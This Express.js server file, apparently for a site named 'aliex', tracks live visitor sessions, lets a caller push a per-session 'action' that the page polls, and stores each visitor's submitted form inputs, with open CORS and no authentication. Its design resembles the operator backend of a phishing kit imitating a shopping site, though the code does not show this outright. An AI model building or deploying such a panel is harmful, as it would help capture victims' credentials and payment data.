const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 4173;
const DIST = '/home/ubuntu/aliex/dist';
const DATA_DIR = '/home/ubuntu/aliex';

app.use(express.json());

// CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  next();
});

// ── Helper: read/write JSON files ─────────────────────────────────────────────
const readJson = (file) => {
  const p = path.join(DATA_DIR, file);
  if (!fs.existsSync(p)) return {};
  try { return JSON.parse(fs.readFileSync(p, 'utf8')); } catch { return {}; }
};
const writeJson = (file, data) => {
  fs.writeFileSync(path.join(DATA_DIR, file), JSON.stringify(data, null, 2));
};

// ── Sessions ──────────────────────────────────────────────────────────────────
app.get('/api/sessions', (req, res) => {
  const sessions = readJson('sessions.json');
  const now = Date.now();
  const active = {};
  Object.entries(sessions).forEach(([id, data]) => {
    if (now - data.lastSeen < 30000) active[id] = data;
  });
  writeJson('sessions.json', active);
  res.json(active);
});

app.post('/api/sessions/:id', (req, res) => {
  const sessions = readJson('sessions.json');
  sessions[req.params.id] = { ...req.body, lastSeen: Date.now() };
  writeJson('sessions.json', sessions);
  res.json({ success: true });
});

app.delete('/api/sessions/:id', (req, res) => {
  const sessions = readJson('sessions.json');
  delete sessions[req.params.id];
  writeJson('sessions.json', sessions);
  res.json({ success: true });
});

// ── Actions ───────────────────────────────────────────────────────────────────
app.get('/api/actions/:id', (req, res) => {
  const actions = readJson('actions.json');
  res.json({ action: actions[req.params.id] || 'normal' });
});

app.post('/api/actions/:id', (req, res) => {
  const actions = readJson('actions.json');
  actions[req.params.id] = req.body.action;
  writeJson('actions.json', actions);
  res.json({ success: true });
});

// ── Inputs ────────────────────────────────────────────────────────────────────
app.get('/api/inputs/:id', (req, res) => {
  const inputs = readJson('inputs.json');
  res.json(inputs[req.params.id] || {});
});

app.post('/api/inputs/:id', (req, res) => {
  const inputs = readJson('inputs.json');
  inputs[req.params.id] = req.body;
  writeJson('inputs.json', inputs);
  res.json({ success: true });
});

// ── Static files ──────────────────────────────────────────────────────────────
app.use(express.static(DIST));

// SPA fallback
app.get('*', (req, res) => {
  res.sendFile(path.join(DIST, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on port ' + PORT);
});
